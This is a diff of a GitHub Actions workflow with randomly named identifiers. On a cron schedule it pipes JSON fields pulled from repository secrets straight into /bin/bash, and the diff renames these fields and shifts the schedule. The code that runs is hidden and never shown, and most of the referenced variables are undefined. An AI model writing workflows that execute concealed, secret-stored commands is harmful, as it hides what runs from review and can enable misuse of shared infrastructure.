@@ -1,8 +1,10 @@
 name: shaobaixing3123
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '13 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +13,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: shaobaixing3123
         env:
-          offhz3174: ${{ secrets.offhz3174 }}
+          djuz2: ${{ secrets.djuz2 }}
         run: |
-          echo $offhz3174 | jq -r .a362 | /bin/bash
-          echo $bgrl4782 | jq -r .vyv73 | /bin/bash
-          echo $bmuck4536 | jq -r .tipmx2 | /bin/bash
-          echo $weww7 | jq -r .t262 | /bin/bash
-          echo $czdxn2527 | jq -r .wywcv6 | /bin/bash
-          echo $r80 | jq -r .afm025 | /bin/bash
-          echo $wae0883 | jq -r .tsfz4 | /bin/bash
-          echo $c3 | jq -r .iuwtl48 | /bin/bash
-          echo $da00279 | jq -r .v53 | /bin/bash
-          echo $p5 | jq -r .vdt3243 | /bin/bash
-          echo $tvkoo622 | jq -r .behhz59 | /bin/bash
-          echo $kmkf9960 | jq -r .nmq9 | /bin/bash
+          echo $djuz2 | jq -r .emco8604 | /bin/bash
+          echo $c723 | jq -r .fn62938 | /bin/bash
+          echo $o41369 | jq -r .slggb760 | /bin/bash
+          echo $z32092 | jq -r .k6770 | /bin/bash
+          echo $pgkdq72051 | jq -r .pkeag20056 | /bin/bash
+          echo $s568 | jq -r .qubky5550 | /bin/bash
 
